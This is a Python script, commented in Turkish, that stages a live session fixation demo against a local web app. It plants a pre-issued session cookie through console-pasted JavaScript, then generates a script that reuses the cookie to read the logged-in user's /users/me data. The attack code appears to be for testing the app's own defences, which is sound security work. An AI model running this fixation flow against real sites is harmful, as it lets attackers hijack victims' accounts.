"""
Session Fixation Attack - Live Demo
Saldırgan: Bu script
Kurban: Kullanıcı (sen)
"""

import requests
import json
from config import BASE_URL, API_URL

print("🔴 SESSION FIXATION ATTACK - LIVE DEMO")
print("="*60)

# 1. SALDIRGAN: Kendi session'ını oluştur
print("\n[ATTACKER] Creating malicious session...")

attacker_session = requests.Session()

# Health endpoint'e istek at (session cookie almak için)
response = attacker_session.get(f"{BASE_URL}/health")

print(f"[ATTACKER] Response status: {response.status_code}")

# Cookie'leri al
attacker_cookies = attacker_session.cookies.get_dict()

print(f"\n[ATTACKER] 🔴 Malicious cookies created:")
for key, value in attacker_cookies.items():
    print(f"  {key} = {value}")

# Cookie'yi dosyaya kaydet
with open('attacker_session.json', 'w') as f:
    json.dump(attacker_cookies, f, indent=2)

print(f"\n[ATTACKER] Cookies saved to: attacker_session.json")

# 2. KURBAN İÇİN TALİMATLAR
print("\n" + "="*60)
print("📋 KURBAN (SEN) İÇİN TALİMATLAR:")
print("="*60)

print("""
1. Browser'ını aç (Chrome/Firefox)
2. http://localhost:3000 adresine git
3. F12 ile DevTools'u aç
4. Console sekmesine geç
5. Şu kodu yapıştır ve Enter'a bas:
""")

# JavaScript kodu oluştur
js_code = ""
for key, value in attacker_cookies.items():
    js_code += f'document.cookie = "{key}={value}; path=/";\n'

print(f"{js_code}")

print("""
6. Sayfayı yenile (F5)
7. Normal şekilde LOGIN OL (asdasd1 / asdasd1)
8. Login olduktan sonra bu scripti çalıştır
""")

# 3. SALDIRGAN: Erişim denemesi için kod
print("\n" + "="*60)
print("🔴 SALDIRGAN ERIŞIM KODU (Login sonrası çalıştır):")
print("="*60)

print("""
# Bu kodu Python'da çalıştır (login sonrası):
python session_fixation_verify.py
""")

# Verify scripti oluştur
verify_script = f'''"""
Session Fixation - Verification Script
Kurban login olduktan sonra çalıştır
"""

import requests
import json

# Saldırganın cookie'sini yükle
with open('attacker_session.json', 'r') as f:
    attacker_cookies = json.load(f)

print("🔴 [ATTACKER] Attempting to access victim's account...")
print(f"   Using cookies: {{attacker_cookies}}")

# Saldırgan kendi cookie'si ile erişmeye çalışır
session = requests.Session()
for key, value in attacker_cookies.items():
    session.cookies.set(key, value)

# Kurbanın bilgilerine erişmeyi dene
response = session.get("{API_URL}/users/me")

print(f"\\n[ATTACKER] Response status: {{response.status_code}}")

if response.status_code == 200:
    user_data = response.json()
    print("\\n🔴 VULNERABLE! Session fixation successful!")
    print("🔴 Attacker accessed victim's account:")
    print(json.dumps(user_data, indent=2))
    print("\\n⚠️  Saldırgan kurbanın hesabına erişti!")
else:
    print("\\n✅ SAFE - Session fixation prevented")
    print(f"   Response: {{response.text}}")
'''

with open('session_fixation_verify.py', 'w', encoding='utf-8') as f:
    f.write(verify_script)

print("\n✅ Verification script created: session_fixation_verify.py")

print("\n" + "="*60)
print("📝 ÖZET:")
print("="*60)
print("""
1. ✅ Saldırgan cookie'si oluşturuldu
2. ✅ Cookie bilgileri kaydedildi
3. ✅ Kurban için JavaScript kodu hazır
4. ✅ Doğrulama scripti oluşturuldu

ŞİMDİ SEN (KURBAN):
- Browser'da console'a JavaScript kodunu yapıştır
- Login ol
- Bana "login oldum" de
- Ben de saldırgan olarak erişmeyi deneyeceğim!
""")
